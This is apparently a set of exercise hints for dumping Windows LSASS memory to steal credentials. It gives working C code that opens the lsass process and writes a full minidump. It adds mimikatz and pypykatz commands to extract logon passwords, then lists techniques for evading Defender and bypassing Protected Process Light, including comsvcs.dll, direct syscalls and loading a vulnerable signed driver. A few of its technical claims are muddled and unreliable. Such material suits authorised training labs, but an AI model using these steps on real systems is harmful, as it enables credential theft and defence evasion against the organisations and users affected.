=== HINT 1: Privilege + PID + process handle ===
// enable_debug_privilege() and find_lsass_pid() helpers are already in the exercise
DWORD lsass_pid = find_lsass_pid();
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid);

=== HINT 2: Create dump file ===
HANDLE hFile = CreateFileA("lsass.dmp", GENERIC_WRITE, 0, NULL,
    CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

=== HINT 3: Write dump ===
BOOL ok = MiniDumpWriteDump(hProc, lsass_pid, hFile,
    MiniDumpWithFullMemory, NULL, NULL, NULL);

=== KEY INSIGHT ===
Parse with: pypykatz lsa minidump lsass.dmp
            mimikatz: sekurlsa::minidump lsass.dmp; sekurlsa::logonPasswords
Defender blocks MiniDumpWriteDump on lsass.exe directly (Protected Process Light).
Evasion techniques:
  - comsvcs.dll rundll32 dump (living-off-the-land)
  - ProcDump (signed MS tool)
  - Direct syscall to bypass user-mode hooks on NtReadVirtualMemory
  - Shadow copy / VSS dump (access lsass.dmp from shadow copy - not PPL protected)
  - ProcExp signed driver (kernel access)
LSASS PPL (Protected Process Light): MiniDumpWriteDump returns ERROR_ACCESS_DENIED.
Bypass: load vulnerable signed driver to remove PPL protection (BYOVD).
